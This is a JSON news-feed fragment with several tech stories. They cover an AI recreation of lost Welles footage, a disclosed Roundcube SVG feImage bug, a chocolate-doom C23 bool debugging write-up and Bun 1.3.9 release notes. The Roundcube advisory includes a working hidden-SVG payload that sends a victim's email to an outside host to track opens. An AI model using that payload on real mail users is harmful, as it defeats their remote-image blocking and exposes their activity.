      "content_text": "When a startup announced plans last fall to recreate lost footage from Orson Welles’ classic film “The Magnificent Ambersons” using generative AI, I was skeptical . More than that, I was baffled why anyone would spend time and money on something that seemed guaranteed to outrage cinephiles while offering negligible commercial value. This week, an in-depth profile by the New Yorker’s Michael Schulman provides more details about the project. If nothing else, it helps explain why the startup Fable and its founder Edward Saatchi are pursuing it: It seems to come from a genuine love of Welles and his work. Saatchi (whose father was a founder of advertising firm Saatchi & Saatchi) recalled a childhood of watching films in a private screening room with his “movie mad” parents. He said he first saw “Ambersons” when he was twelve. The profile also explains why “Ambersons,” while much less famous than Welles’ first film “Citizen Kane,” remains so tantalizing — Welles himself claimed it was a “much better picture” than “Kane,” but after a disastrous preview screening, the studio cut 43 minutes from the film, added an abrupt and unconvincing happy ending, and eventually destroyed the excised footage to make space in its vaults. “To me, this is the holy grail of lost cinema,” Saatchi said. “It just seemed intuitively that there would be some way to undo what had happened.” Saatchi is only the latest Welles devotee to dream of recreating the lost footage. In fact, Fable is working with filmmaker Brian Rose, who already spent years trying to achieve the same thing with animated scenes based on the movie’s script and photographs, and on Welles’ notes. (Rose said that after he screened the results for friends and family, “a lot of them were scratching their heads.”) So while Fable is using more advanced technology — filming scenes in live action, then eventually overlaying them with digital recreations of the original actors and their voices — this project is best understood as a slicker, better-funded version of Rose’s work. It’s a fan’s attempt to glimpse Welles’ vision. Techcrunch event Boston, MA | June 23, 2026 Notably, while the New Yorker article includes a few clips of Rose’s animations, as well as images of Fable’s AI actors, there’s no footage showing the results of Fable’s live action-AI hybrid. By the company’s own admission, there are significant challenges, whether that’s fixing obvious blunders like a two-headed version of the actor Joseph Cotten, or the more subjective task of recreating the complex beauty of the film’s cinematography. (Saatchi even described a “happiness” problem, with the AI tending to make the film’s women look inappropriately happy.) As for whether this footage will ever be released to the public, Saatchi admitted it was “a total mistake” not to speak to Welles’ estate before his announcement. Since then, he has reportedly been working to win over both the estate and Warner Bros., which owns the rights to the film. Welles’ daughter Beatrice told Schulman that while she remains “skeptical,” she now believes “they are going into this project with enormous respect toward my father and this beautiful movie.” The actor and biographer Simon Callow — who’s currently writing the fourth book in his multi-volume Welles biography — has also agreed to advise the project, which he described as a “great idea.” (Callow is a family friend of the Saatchis.) But not everyone has been convinced. Melissa Galt said her mother, the actress Anne Baxter, would “not have agreed with that at all.” “It’s not the truth,” Galt said. “It’s a creation of someone else’s truth. But it’s not the original, and she was a purist.” And while I’ve become more sympathetic to Saatchi’s aims, I still agree with Galt: At its best, this project will only result in a novelty, a dream of what the movie might have been. In fact, Galt’s description of her mother’s position that “once the movie was done, it was done,” reminded me of a recent essay in which the writer Aaron Bady compared AI to the vampires in “Sinners.” Bady argued that when it comes to art, both vampires and AI will always come up short, because “what makes art possible” is a knowledge of mortality and limitations. “There is no work of art without an ending, without the point at which the work ends (even if the world continues),” he wrote, adding, “Without death, without loss, and without the space between my body and yours, separating my memories from yours, we cannot make art or desire or feeling.” In that light, Saatchi’s insistence that there must be “some way to undo what had happened” feels, if not outright vampiric, then at least a little childish in its unwillingness to accept that some losses are permanent. It may not, perhaps, be all that different from a startup founder claiming they can make grief obsolete — or a studio executive insisting that “The Magnificent Ambersons” needed a happy ending.",
      "cover_image_url": "https://techcrunch.com/wp-content/uploads/2025/09/GettyImages-3348882.jpg?w=1024"
    },
    {
      "industry": "technology",
      "source": "Hacker News (Frontpage)",
      "title": "Ask HN: What are you working on? (February 2026)",
      "url": "https://news.ycombinator.com/item?id=46937696",
      "published": "2026-02-08T19:35:55+00:00",
      "summary": "<p>What are you working on? Any new ideas that you're thinking about?</p> <hr /> <p>Comments URL: <a href=\"https://news.ycombinator.com/item?id=46937696\">https://news.ycombinator.com/item?id=46937696</a></p> <p>Points: 77</p> <p># Comments: 229</p>",
      "content_text": "",
      "cover_image_url": null
    },
    {
      "industry": "technology",
      "source": "Hacker News (Frontpage)",
      "title": "Roundcube Webmail <1.5.13 / <1.6.13 allows attackers to force remote image loads via SVG feImage",
      "url": "https://nullcathedral.com/posts/2026-02-08-roundcube-svg-feimage-remote-image-bypass/",
      "published": "2026-02-08T18:24:26+00:00",
      "summary": "<p>Article URL: <a href=\"https://nullcathedral.com/posts/2026-02-08-roundcube-svg-feimage-remote-image-bypass/\">https://nullcathedral.com/posts/2026-02-08-roundcube-svg-feimage-remote-image-bypass/</a></p> <p>Comments URL: <a href=\"https://news.ycombinator.com/item?id=46937012\">https://news.ycombinator.com/item?id=46937012</a></p> <p>Points: 105</p> <p># Comments: 31</p>",
      "content_text": "Roundcube Webmail <1.5.13 / <1.6.13 allows attackers to force remote image loads via SVG feImage Roundcube's HTML sanitizer doesn't treat SVG feImage href as an image source. Attackers can bypass remote image blocking to track email opens. TL;DR: Roundcube’s rcube_washtml sanitizer blocked external resources on <img> , <image> , and <use> , but not on <feImage> . Its href went through the wrong code path and got allowed through. Attackers could track email opens even when “Block remote images” was on. Fixed in 1.5.13 and 1.6.13. Vulnerability information # Field Value Vendor Roundcube Product Roundcube Webmail Affected versions < 1.5.13, 1.6.x < 1.6.13 Fixed in 1.5.13, 1.6.13 Disclosure date 2026-02-08 Background # When allow_remote is false, Roundcube’s sanitizer intercepts image-bearing attributes ( src on <img> , href on <image> and <use> ) and runs them through is_image_attribute() . That function blocks external URLs. Separately, non-image URLs (like <a href> ) go through wash_link() , which lets HTTP/HTTPS URLs through. That’s fine for links the user clicks on intentionally. Discovery # I got bored during my christmas vacation and this SVG-based XSS fix via the animate tag appeared on my radar. One SVG bug usually means more. So I spent some time going through rcube_washtml.php , looking at which SVG elements made it onto the allowlist and how their attributes get handled and sanitized. <feImage> stood out. Its href gets fetched on render, same as <img src> . But the sanitizer sends it through wash_link() instead of is_image_attribute() . So the “Block remote images” setting doesn’t apply to it. Technical details # In wash_attribs() , every attribute hits a chain of checks. The first one that matches wins: rcube_washtml.php if ( $this -> is_image_attribute ( $node -> nodeName , $key )) { $out = $this -> wash_uri ( $value , true ); // blocks remote URLs } elseif ( $this -> is_link_attribute ( $node -> nodeName , $key )) { $out = $this -> wash_link ( $value ); // allows http/https } Before the fix, is_image_attribute() looked like this: rcube_washtml.php private function is_image_attribute ( $tag , $attr ) { return $attr == 'background' || $attr == 'color-profile' || ( $attr == 'poster' && $tag == 'video' ) || ( $attr == 'src' && preg_match ( '/^(img|image|source|input|video|audio)$/i' , $tag )) || ( $tag == 'use' && $attr == 'href' ) || ( $tag == 'image' && $attr == 'href' ); } The href attribute is only matched for use and image . No feimage . And is_link_attribute() is a catch-all : rcube_washtml.php private function is_link_attribute ( $tag , $attr ) { return $attr === 'href' ; } So when the sanitizer encounters <feImage href=\"https://...\"> : is_image_attribute('feimage', 'href') returns false, is_link_attribute('feimage', 'href') returns true, and the URL goes through wash_link() which passes HTTP/HTTPS URLs straight through. Proof of concept # An invisible 1x1 SVG, positioned off-screen: < svg width = \"1\" height = \"1\" style = \"position:absolute;left:-9999px;\" > < defs > < filter id = \"t\" > < feImage href = \"https://httpbin.org/image/svg?email=victim@test.com\" width = \"1\" height = \"1\" /> </ filter > </ defs > < rect filter = \"url(#t)\" width = \"1\" height = \"1\" /> </ svg > The browser evaluates the SVG filter and fires a GET to the attacker’s URL. Impact # The “Block remote images” setting doesn’t block this remote image. An attacker can confirm you opened it, log your IP, and fingerprint your browser. The fix ( 26d7677 ) collapses the two separate use / image checks into a single regex that includes feimage : rcube_washtml.php || ( $attr == 'href' && preg_match ( '/^(feimage|image|use)$/i' , $tag )); // SVG Now <feImage href> hits is_image_attribute() first, gets routed through wash_uri() , and the remote URL is blocked. Update to 1.5.13 or 1.6.13. Timeline # Date Event 2026-01-04 Reported to Roundcube 2026-02-08 1.5.13 and 1.6.13 released 2026-02-08 This post",
      "cover_image_url": "https://nullcathedral.com/og-image.png"
    },
    {
      "industry": "technology",
      "source": "Hacker News (Frontpage)",
      "title": "The little bool of doom",
      "url": "https://blog.svgames.pl/article/the-little-bool-of-doom",
      "published": "2026-02-08T18:02:50+00:00",
      "summary": "<p>Article URL: <a href=\"https://blog.svgames.pl/article/the-little-bool-of-doom\">https://blog.svgames.pl/article/the-little-bool-of-doom</a></p> <p>Comments URL: <a href=\"https://news.ycombinator.com/item?id=46936828\">https://news.ycombinator.com/item?id=46936828</a></p> <p>Points: 82</p> <p># Comments: 29</p>",
      "content_text": "I must confess I have a bit of a soft spot for classic DOOM . Despite 31 long years, the game is still mighty fun to play yourself (admittedly, I rather suck at it) or to watch others play it (this one I'm better at); and with the source code being available, you can enjoy it on every modern platform – be it desktop, smartphone, digital camera , oscilloscope , or anything else you can imagine. As a result of this, through various circumstances, I came to maintain several DOOM-related packages in Fedora Linux. Now, a few months before each new release, the Fedora Linux project performs a mass rebuild of all its packages. This has a few benefits, such as ensuring ABI compatibility, updating statically-linked dependencies, making use of new compiler optimisations/code hardening options, and so on. Either way, with Fedora Linux 42 slated to be released mid-April, the time for the Mass Rebuild has come – and, as it often happens, not all of my packages made it through. One of those that failed the rebuild was chocolate-doom . Two times false does not make right Well, all right. The first step to finding out what happened was to check the build logs. gcc -DHAVE_CONFIG_H -I. -I../.. -I../../src -I/usr/include/SDL2 -D_GNU_SOURCE=1 -D_REENTRANT -I/usr/include/SDL2 -D_GNU_SOURCE=1 -D_REENTRANT -I/usr/include/SDL2 -D_GNU_SOURCE=1 -D_REENTRANT -O2 -g -Wall -Wdeclaration-after-statement -Wredundant-decls -O2 -flto=auto -ffat-lto-objects -fexceptions -g -grecord-gcc-switches -pipe -Wall -Werror=format-security -Wp,-U_FORTIFY_SOURCE,-D_FORTIFY_SOURCE=3 -Wp,-D_GLIBCXX_ASSERTIONS -specs=/usr/lib/rpm/redhat/redhat-hardened-cc1 -fstack-protector-strong -specs=/usr/lib/rpm/redhat/redhat-annobin-cc1 -mbranch-protection=standard -fasynchronous-unwind-tables -fstack-clash-protection -fno-omit-frame-pointer -mno-omit-leaf-frame-pointer -I/usr/include/SDL2 -D_GNU_SOURCE=1 -D_REENTRANT -I/usr/include/libpng16 -DWITH_GZFILEOP -I/usr/include/pipewire-0.3 -I/usr/include/spa-0.2 -D_REENTRANT -I/usr/lib64/pkgconfig/../../include/dbus-1.0 -I/usr/lib64/pkgconfig/../../lib64/dbus-1.0/include -I/usr/include/libinstpatch-2 -I/usr/include/glib-2.0 -I/usr/lib64/glib-2.0/include -I/usr/include/sysprof-6 -pthread -I/usr/include/opus -D_DEFAULT_SOURCE -D_XOPEN_SOURCE=600 -c -o deh_bexstr.o deh_bexstr.c In file included from ../../src/sha1.h:21, from ../../src/deh_defs.h:21, from deh_bexstr.c:22: ../../src/doomtype.h:113:5: error: cannot use keyword ‘false’ as enumeration constant 113 | false, | ^~~~~ ../../src/doomtype.h:113:5: note: ‘false’ is a keyword with ‘-std=c23’ onwards Oh, so this was a compilation error. Having received a lot of flak over the years about cryptic error messages, GCC spent the last few years vastly improving on this front; and now, the error message I got, together with the note that followed it, made the issue clear. Inside the engine code, chocolate-doom declares its own boolean type: #if defined(__cplusplus) || defined(__bool_true_false_are_defined) typedef bool boolean ; #else typedef enum { false , true } boolean ; #endif So, when treating the sources as C++, it uses the C++ bool type, whereas when treating the sources as C, it ships its own, custom type. This worked fine with older C standards, as C89 did not contain a boolean type at all, whereas the type introduced by C99 was named _Bool – though you could include the <stdbool.h> header, which declared bool , true and false macros to make things prettier. Come C23, _Bool is renamed to bool , and all three of bool , true and false are now proper keywords. Ok, so it makes perfect sense that this custom boolean type clashes with the false and true keywords – but begs the question, why did it fail now, when it worked perfectly fine a few months ago? Why does it build as C23? A fairly standard change As I wrote a few paragraphs ago, one of the goals of the Mass Rebuild is to ensure that code inside the distro can still be built with a modern compiler. If you look at GCC's version history , you'll notice that for the last decade, the release schedule seems to follow a pattern of introducing a new major version once a year, somewhere between April and May – which fits the Fedora Linux release schedule quite nicely, and makes Fedora a great place to test GCC pre-releases on a large, varied codebase. This time was no different, with GCC 15.0.1 landing in Fedora Rawhide (the \"eternal alpha\" development version) just a few hours before the Mass Rebuild began. Among this versions's changes , there is one relevant to my problem – the default C standard has been changed from -std=gnu17 to -std=gnu23 . And sure enough, if you go back to the build log and carefully go over the compiler invocation, you'll notice that there's no -std= option to explicitly set the standard. Ok, so what now? Thinking about it for a bit, there seemed to be three solutions to this problem: Explicitly set the C standard to C17 or older, so the code is built using the custom boolean type. Modify the code by changing the #ifdef , so the compiler uses the built-in bool type when in C23 mode. Rename the enum variants to False and True and modify all the usages accordingly. Option 1) seemed like the easiest one, but it also felt a bit like kicking the can down the road – plus, it introduced the question of which standard to use. Option 2) was fairly straightforward to implement, and arguably, it made for more idiomatic code. Option 3) was probably the safest one, but also most tedious. After brief deliberation, I went with the second one. --- a/src/doomtype.h +++ b/src/doomtype.h @@ -100,9 +100,9 @@ #include <inttypes.h> -#if defined ( __cplusplus ) || defined ( __bool_true_false_are_defined ) +#if defined ( __cplusplus ) || defined ( __bool_true_false_are_defined ) || ( __STDC_VERSION__ >= 202311L ) -// Use builtin bool type with C++. +// Use builtin bool type with C++ and C23. typedef bool boolean; The patch was easy to implement, and after applying it, the Fedora package built successfully. Satisfied with my quick and easy fix, I opened a pull request upstream . The engine goes boom My proposal prompted some debate between the maintainers, who eventually decided that the best course of action will be to declare the project as written using C99. One of them cooked up another pull request : --- a/src/doomtype.h +++ b/src/doomtype.h @@ -99,12 +99,11 @@ // standard and defined to include stdint.h, so include this. #include <inttypes.h> +#include <stdbool.h> #if defined ( __cplusplus ) || defined ( __bool_true_false_are_defined ) -// Use builtin bool type with C++. - -typedef bool boolean; +typedef int boolean; #else The added #include made perfect sense – with C99, <stdbool.h> is guaranteed to exist and it should provide definitions for bool , true and false . However, the change in the typedef was curious – it meant that despite the switch to C99, the code would still store boolean values as integers, instead using of the proper bool / _Bool type. This prompted another short discussion: <turol> Explicitly setting the C standard is fine but we shouldn't change the includes or boolean type. <fabiangreffrath> Chocolate Doom doesn't even start if we keep #typedef bool boolean . <suve> What do you mean by \"doesn't even start\"? Crashes right away? Including <stdbool.h> adds the #define bool _Bool macro, so keeping typedef bool boolean means you're using the C99 _Bool type. <fabiangreffrath> It fails with: R_InitSprites: Sprite TROO frame I has rotations and a rot=0 lump . Huh. Apparently using _Bool for boolean values dooms the engine to exit with an error during startup. Interesting! Let's try debugging. From the error message, one can find the place in the code where the error occurs: if ( sprtemp [ frame ] . rotate == false ) I_Error ( \"R_InitSprites: Sprite %s frame %c has rotations \" \"and a rot=0 lump\" , spritename , 'A' + frame ) ; What exactly's happening here? I'll skip on pasting more code snippets and just give you a quick rundown: The code's inside a function, R_InstallSpriteLump() . frame is an argument to the function. While it's not marked as const , it is not modified inside the function. sprtemp is a global variable, holding an array of 29 spriteframe_t structs. The .rotate field inside said struct is of boolean type. All right. So the problem is this: when boolean is a custom enum type, the code works as expected and the error condition is false; but when using _Bool , the condition evaluates as true and exit-on-error is triggered. Sounds rather sketchy... Let's try poking at memory using gdb . I'll start with the working version. $ gdb ./build/src/chocolate-doom--enum [...] (gdb) break src/doom/r_things.c:138 Breakpoint 1 at 0x44f822: file chocolate-doom/src/doom/r_things.c, line 138. (gdb) run [...] Thread 1 \"chocolate-doom\" hit Breakpoint 1, R_InstallSpriteLump (lump=1242, frame=0, rotation=1, flipped=false) at chocolate-doom/src/doom/r_things.c:138 138 if (sprtemp[frame].rotate == false) (gdb) print sprtemp[frame] $1 = {rotate = (true | unknown: 0xfffffffe), lump = {-1, -1, -1, -1, -1, -1, -1, -1}, flip = \"\\377\\377\\377\\377\\377\\377\\377\\377\"} (gdb) step 142 sprtemp[frame].rotate = true; Okay, so our boolean value is filled with... uh, what? The notation was rather confusing for me at first, but it turns out that since the boolean type is an enum, gdb tries to be helpful by showing how the value can be constructed by bit-oring several legal values of the enum. (Except it doesn't really work in this case.) Either way, true is 1, and bit-oring that with the \"unknown\" value gives 0xffffffff – which suggests that the field is initialized by writing -1 to it at some earlier point. And indeed, looking through the backtrace and into the calling function, one can find a memset (sprtemp,-1, sizeof(sprtemp)); call. Great, so at least that's one mystery solved. Back to our breakpoint, we have a simple comparison between 0xffffffff and 0x0 , which evaluates as false. That makes sense. Let's take a look at the _Bool version, then. $ gdb ./build/src/chocolate-doom--bool [...] (gdb) break src/doom/r_things.c:138 Breakpoint 1 at 0x44f822: file chocolate-doom/src/doom/r_things.c, line 138. (gdb) run [...] Thread 1 \"chocolate-doom\" hit Breakpoint 1, R_InstallSpriteLump (lump=1242, frame=0, rotation=1, flipped=false) at chocolate-doom/src/doom/r_things.c:138 138 if (sprtemp[frame].rotate == false) (gdb) print sprtemp[frame] $1 = {rotate = 255, lump = {-1, -1, -1, -1, -1, -1, -1, -1}, flip = \"\\377\\377\\377\\377\\377\\377\\377\\377\"} The size of boolean is now smaller – down from 4 bytes to just 1 byte. Apart from that, we're in the exact same place as before – the field's been initialized to -1 , and the program's about to check if 255 == 0 . (gdb) step 139 I_Error (\"R_InitSprites: Sprite %s frame %c has rotations \" I, uh... I mean... w h a t ? We need to go deeper Yeah, so that was rather unexpected. Thinking that there may be some hidden interaction with another part of the code that I'm not seeing, I tried reproducing the issue in a smaller program. #include <stdio.h> #include <string.h> #ifdef DUPA #include <stdbool.h> typedef bool boolean ; #else typedef enum { false , true } boolean ; #endif boolean some_var [ 30 ] ; int main ( void ) { memset ( some_var , - 1 , sizeof ( some_var ) ) ; some_var [ 0 ] = false ; some_var [ 1 ] = 500 ; for ( int i = 0 ; i <= 2 ; ++ i ) { if ( some_var [ i ] == false ) printf ( \"some_var[%d] is false \\n \" , i ) ; if ( some_var [ i ] == true ) printf ( \"some_var[%d] is true \\n \" , i ) ; printf ( \"value of some_var[%d] is %d \\n \" , i , some_var [ i ] ) ; } return 0 ; } Sure enough, the behaviour was consistent with what I saw inside the game: $ gcc -o booltest ./booltest.c $ ./booltest some_var[0] is false value of some_var[0] is 0 some_var[1] is true value of some_var[1] is 1 value of some_var[2] is -1 $ gcc -DDUPA -o booltest ./booltest.c $ ./booltest some_var[0] is false value of some_var[0] is 0 some_var[1] is true value of some_var[1] is 1 some_var[2] is false some_var[2] is true value of some_var[2] is 255 Somehow, setting a _Bool value to 255 meant that it was true and false at the same time. I wasn't gonna get more answers by just juggling C code around, which meant that it was time to take a look at how things look at the assembly level. For this, I used the Godbolt compiler explorer . Ah-ha! The generated instructions were ever so slightly different. This would be great news, if it wasn't for me forgetting about one little detail: I have zero knowledge of x86 assembly . Luckily for me, there's this nifty little thing called the Internet, where you can find answers to a lot of life's questions. After consulting some sources, I started translating the assembly instructions into plain Polish (for your convenience, though, I'll go with English). In all four scenarios, the code starts by loading some_value[i] into the eax register. boolean is an enum , checking for true CMP eax, 1 This one is straightforward – it compares the value of the register with 1. If the arguments are equal, the \"zero flag\" (ZF) is set; otherwise, the flag gets unset. JNE .L4 This checks ZF and if it's unset, performs a jump, skipping over the printf() call. Okay, so the behaviour is flipped – instead of \"do stuff when variable equals 1\", I got \"skip over stuff when variable does not equal 1\" – but that makes perfect sense in assembly. Overall, the code is exactly what I expected. boolean is an enum , checking for false TEST eax, eax This calculates a bitwise AND of the register and itself. ZF is set if the result is zero and unset otherwise. JNE .L3 If ZF is unset, this performs a jump and skips over the printf() call. This time the assembly is slightly more funky, as instead of \"compare with zero\", I got \"perform bitwise AND of the value and itself\" – which I assume is a micro-optimisation of some sort. Still, the code effectively does what I'd expect it to – skipping the printf() on any non-zero value. boolean is _Bool , checking for true TEST al, al This once again calculates a bitwise AND of the value and itself and sets ZF if the result is zero. al is an 8-bit register that corresponds to the 8 lowest bits of eax – this is done because the boolean values are now just 1 byte in size, instead of 4, like before. JE .L4 Jump if ZF is set. Now it's getting interesting! Looks like in this version, the logic is not \"skip when variable does not equal 1\", but rather \"skip when variable equals 0\". boolean is _Bool , checking for false XOR eax, 1 This performs a bitwise XOR of the value and 1. The first argument is re-used as the destination. Effectively, this will flip the lowest bit of the boolean value – changing 0 to 1, or 1 to 0. TEST al, al Once again, perform a bitwise AND and set ZF if the result is zero. JE .L3 Jump if ZF is set. Oh boy. So it flips the lowest bit, and then jumps if the post-flip value is zero. This means that the logic becomes \"skip when variable equals 1\". Summing up When boolean is an enum , the compiler does exactly what I expected – the == false condition checks if the value is equal to 0, and the == true condition checks if the value is equal to 1. However, when boolean is actually _Bool , the == false check is transformed into != 1 , and the == true check is transformed into != 0 – which makes perfect sense in the realm of boolean logic. But it also means that for a value of 255, hilarity ensures: since 255 is neither 0 nor 1, both conditions pass! Do they really have a law for that? Now that I knew what was happening, one last riddle to solve was why it was happening. I mean, sticking an invalid value into a type and getting a weird result isn't exactly unexpected, and since we're talking about C, I was fairly certain I've just ran into everyone's favourite aspect of the language – Undefined Behaviour. Compiling with UBSan quickly confirmed this hypothesis. $ gcc -DDUPA -fsanitize=undefined -o booltest ./booltest.c $ ./booltest some_var[0] is false value of some_var",
      "cover_image_url": "/image/doombool-assembly.png"
    },
    {
      "industry": "technology",
      "source": "Hacker News (Frontpage)",
      "title": "Bun v1.3.9 | Bun Blog",
      "url": "https://bun.com/blog/bun-v1.3.9",
      "published": "2026-02-08T17:39:00+00:00",
      "summary": "<p>Article URL: <a href=\"https://bun.com/blog/bun-v1.3.9\">https://bun.com/blog/bun-v1.3.9</a></p> <p>Comments URL: <a href=\"https://news.ycombinator.com/item?id=46936595\">https://news.ycombinator.com/item?id=46936595</a></p> <p>Points: 147</p> <p># Comments: 36</p>",
      "content_text": "To install Bun curl curl -fsSL https://bun.sh/install | bash powershell powershell -c \" irm bun.sh/install.ps1|iex \" docker docker run --rm --init --ulimit memlock=-1:-1 oven/bun To upgrade Bun Run multiple package.json scripts concurrently or sequentially with Foreman-style prefixed output. Includes full --filter and --workspaces integration for running scripts in parallel or sequential across workspace packages. # Run \"build\" and \"test\" concurrently from the current package.json bun run --parallel build test # Run \"build\" and \"test\" sequentially with prefixed output bun run --sequential build test # Glob-matched script names bun run --parallel \" build:* \" # Run \"build\" in all workspace packages concurrently bun run --parallel --filter ' * ' build # Run \"build\" in all workspace packages sequentially bun run --sequential --workspaces build # Multiple scripts across all packages bun run --parallel --filter ' * ' build lint test # Continue running even if one package fails bun run --parallel --no-exit-on-error --filter ' * ' test # Skip packages missing the script bun run --parallel --workspaces --if-present build Each line of output is prefixed with a colored, padded label so you can tell which script produced it: build | compiling... test | running suite... lint | checking files... When combined with --filter or --workspaces , labels include the package name: pkg-a:build | compiling... pkg-b:build | compiling... --parallel starts all scripts immediately with interleaved, prefixed output. --sequential runs scripts one at a time in order. By default, a failure in any script kills all remaining scripts ‚Äî use --no-exit-on-error to let them all finish. Pre/post scripts ( prebuild / postbuild ) are automatically grouped with their main script and run in the correct dependency order within each group. bun --filter=\"pkg\" <script> respects dependency order. It doesn't start a script until all it's dependendents are also run. This can be an issue when using long-lived watch-like scripts. --parallel and --sequential do not respect dependency order so they won't wait. The net.Server ‚Üí Http2SecureServer connection upgrade pattern now works correctly. This pattern is used by libraries like http2-wrapper , crawlee , and custom HTTP/2 proxy servers that accept raw TCP connections on a net.Server and forward them to an Http2SecureServer via h2Server.emit('connection', rawSocket) . import { createServer } from \" node:net \" ; import { createSecureServer } from \" node:http2 \" ; import { readFileSync } from \" node:fs \" ; const h2Server = createSecureServer ({ key : readFileSync ( \" key.pem \" ), cert : readFileSync ( \" cert.pem \" ), }); h2Server. on ( \" stream \" , ( stream , headers ) => { stream. respond ({ \" :status \" : 200 }); stream. end ( \" Hello over HTTP/2! \" ); }); const netServer = createServer (( rawSocket ) => { // Forward the raw TCP connection to the HTTP/2 server h2Server. emit ( \" connection \" , rawSocket); }); netServer. listen ( 8443 ); mock() and spyOn() now implement Symbol.dispose , enabling the using keyword to automatically restore mocks when they go out of scope. This eliminates the need to manually call mockRestore() or rely on afterEach cleanup. import { spyOn, expect, test } from \" bun:test \" ; test ( \" auto-restores spy \" , () => { const obj = { method : () => \" original \" }; { using spy = spyOn (obj, \" method \" ). mockReturnValue ( \" mocked \" ); expect (obj. method ()). toBe ( \" mocked \" ); } // automatically restored when `spy` leaves scope expect (obj. method ()). toBe ( \" original \" ); }); [Symbol.dispose] is aliased to mockRestore , so it works with both spyOn() and mock() : import { mock } from \" bun:test \" ; const fn = mock (() => \" original \" ); fn (); expect (fn). toHaveBeenCalledTimes ( 1 ); fn[ Symbol .dispose](); // same as fn.mockRestore() expect (fn). toHaveBeenCalledTimes ( 0 ); Previously, setting NO_PROXY only worked when the proxy was auto-detected from http_proxy / HTTP_PROXY environment variables. If you explicitly passed a proxy option to fetch() or new WebSocket() , the NO_PROXY environment variable was ignored. Now, NO_PROXY is always checked ‚Äî even when a proxy is explicitly provided via the proxy option. // NO_PROXY=localhost // Previously, this would still use the proxy. Now it correctly bypasses it. await fetch ( \" http://localhost:3000/api \" , { proxy : \" http://my-proxy:8080 \" , }); // Same fix applies to WebSocket const ws = new WebSocket ( \" ws://localhost:3000/ws \" , { proxy : \" http://my-proxy:8080 \" , }); Bun now supports the --cpu-prof-interval flag to configure the CPU profiler's sampling interval in microseconds, matching Node.js's flag of the same name. The default interval is 1000Œºs (1ms). # Sample every 500Œºs for higher resolution profiling bun --cpu-prof --cpu-prof-interval 500 index.js If used without --cpu-prof or --cpu-prof-md , Bun will emit a warning. Using --bytecode with --format=esm is now supported. Previously, this was unsupported due to missing functionality in JavaScriptCore and now it's fully supported. When --bytecode is used without an explicit --format , it continues to default to CommonJS. In a future version of Bun, we may change that default to ESM to make the behavior more consistent. Thanks to @alistair! Fixed crashes on older ARM64 processors (Cortex-A53, Raspberry Pi 4, AWS a1 instances) caused by mimalloc emitting LSE atomic instructions that require ARMv8.1 or later. Bun now correctly targets ARMv8.0 on Linux aarch64, using outline atomics for runtime dispatch. Bun.Markdown now uses SIMD-accelerated scanning to find characters that need HTML escaping ( & , < , > , \" ), resulting in 3-15% faster Markdown-to-HTML rendering throughput. Larger documents with fewer special characters see the biggest gains. Thanks to @billywhizz for the contribution! Cached frequently-used HTML tag strings ( div , p , h1 - h6 , etc.) in the React renderer for Bun.markdown.react() , avoiding repeated string allocations on every element creation. Input size Before After Improvement Small (121 chars) 3.20 ¬µs 2.30 ¬µs 28% faster Medium (1,039 chars) 15.09 ¬µs 14.02 ¬µs 7% faster Large (20,780 chars) 288.48 ¬µs 267.14 ¬µs 7.4% faster String object count reduced by 40% and heap size reduced by 6% for a typical render. AbortSignal.abort() now skips creating and dispatching an Event object when there are no registered listeners, avoiding unnecessary object allocation and dispatch overhead. This results in a ~6% improvement in micro-benchmarks (~16ms saved per 1M calls). Case Before After Improvement no listener 271 ms 255 ms ~6% with listener 368 ms 370 ms (same) Thanks to @sosukesuzuki for the contribution! Regular expressions got a major performance boost with a new SIMD-accelerated prefix search, inspired by V8's approach. When a regex has alternatives with known leading characters (e.g., /aaaa|bbbb/ ), JSC now uses SIMD instructions to scan 16 bytes at a time, rapidly rejecting non-matching positions before falling back to scalar matching. This is implemented for both ARM64 (using TBL2) and x86_64 (using PTEST), so all platforms benefit. The x86_64 codegen also gained new constant materialization primitives ( move128ToVector , move64ToDouble , move32ToFloat ) using broadcast and shuffle instructions, which are necessary for the SIMD regex paths and future SIMD optimizations. 579b96614b75 ‚Äî SIMD fast prefix search for RegExp (ARM64) b7ed3dae4a6a ‚Äî SIMD fast prefix search for RegExp (x86_64) aa596dded063 ‚Äî x86_64 constant materialization for SIMD masks Non-capturing parenthesized subpatterns with fixed-count quantifiers like (?:abc){3} previously fell back to the slower Yarr interpreter. They are now JIT-compiled using a counter-based loop, yielding a ~3.9x speedup on affected patterns. A follow-up patch also added JIT support for fixed-count subpatterns with capture groups (e.g., /(a+){2}b/ ), correctly saving and restoring capture state across iterations. ac63cc259d74 ‚Äî JIT support for non-capturing fixed-count parentheses (~3.9x faster) c8b66aa0832b ‚Äî JIT support for fixed-count subpatterns with captures String.prototype.startsWith is now an intrinsic in the DFG and FTL JIT tiers, with constant folding support when both the string and search term are known at compile time. Benchmark Speedup string-prototype-startswith 1.42x faster string-prototype-startswith-constant-folding 5.76x faster string-prototype-startswith-with-index 1.22x faster The .size getter on Set and Map is now handled as an intrinsic in the DFG/FTL tiers and inline caches, eliminating the overhead of a generic getter call. Benchmark Speedup set-size 2.24x faster map-size 2.74x faster String.prototype.trim , trimStart , and trimEnd now use direct pointer access via span8() / span16() instead of indirect str[i] character access, avoiding repeated bounds checking. Benchmark Speedup string-trim 1.17x faster string-trim-end 1.42x faster string-trim-start 1.10x faster Object.defineProperty is now recognized as an intrinsic in the DFG and FTL JIT tiers. While this patch alone doesn't change benchmark numbers, it lays the groundwork for future optimizations that can specialize based on descriptor shape. When using \"string\".replace(\"search\", \"replacement\") with string arguments, JSC now constructs a rope (lazy concatenation) instead of eagerly copying the entire result. This avoids unnecessary allocations for the common case where the result is only used briefly. This aligns with V8's behavior. Fixed: existsSync('.') , statSync('.') , and other node:fs operations incorrectly failing on Windows due to '.' being normalized to an empty string instead of the current directory. Fixed: Function.prototype.toString() whitespace now matches V8/Node.js Fixed 3 rare crashes in node:http2 Fixed: Bun.stringWidth incorrectly reporting Thai SARA AA ( U+0E32 ), SARA AM ( U+0E33 ), and their Lao equivalents ( U+0EB2 , U+0EB3 ) as zero-width characters instead of width 1. These are spacing vowels, not combining marks, so common Thai words like ‡∏Ñ‡∏≥ now correctly return a width of 2 instead of 1. Fixed: a crash that could occur in the WebSocket client when using binaryType = \"blob\" and receiving \"data\" events when no event listener attached. Fixed: Sequential HTTP requests with proxy-style absolute URLs (e.g. GET http://example.com/path HTTP/1.1 ) hanging on the 2nd+ request when using keep-alive connections. This affected HTTP proxy servers built with Bun, which could only handle one request per connection. Fixed: A security issue in the HTTP server chunked encoding parser that could lead to request smuggling. Fixed: Bun.Build.CompileTarget TypeScript type was missing SIMD variants like bun-linux-x64-modern 